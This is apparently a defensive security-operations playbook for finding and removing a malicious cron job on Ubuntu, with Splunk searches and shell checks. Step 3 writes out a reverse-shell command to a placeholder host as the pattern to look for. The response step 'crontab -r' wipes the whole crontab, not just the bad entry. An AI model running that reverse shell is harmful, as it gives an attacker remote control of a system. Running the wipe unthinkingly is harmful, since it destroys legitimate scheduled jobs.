# 🔁 Persistence Investigation (Cron Job)

## 📌 Objective

Identify and remove persistence mechanisms.

---

## 🚨 Alert Trigger

`cron_persistence_detection.spl`

---

## 🧠 What Happened?

Attacker created a cron job:
👉 executes reverse shell repeatedly

---

## 🔍 Step 1: Detect Cron Changes

```spl
index=* "crontab"
| table _time user command
```

---

## 🔍 Step 2: Check Suspicious Entries

On Ubuntu:

```bash
crontab -l
```

---

## 🔍 Step 3: Look for Reverse Shell

👉 Example:

```bash
bash -i >& /dev/tcp/<ip>/4444
```

---

## 🔍 Step 4: Validate Execution

```bash
ps aux | grep cron
```

---

## 🧠 Analysis

* Persistence ensures attacker access after reboot
* High risk if not removed

---

## 📊 Timeline

```spl
index=* "crontab"
| sort _time
```

---

## 🚨 Response

* Remove cron job:

```bash
crontab -r
```

* Kill running shell
* Block attacker IP

---

## ✅ Conclusion

Persistence confirmed → **Long-term compromise**
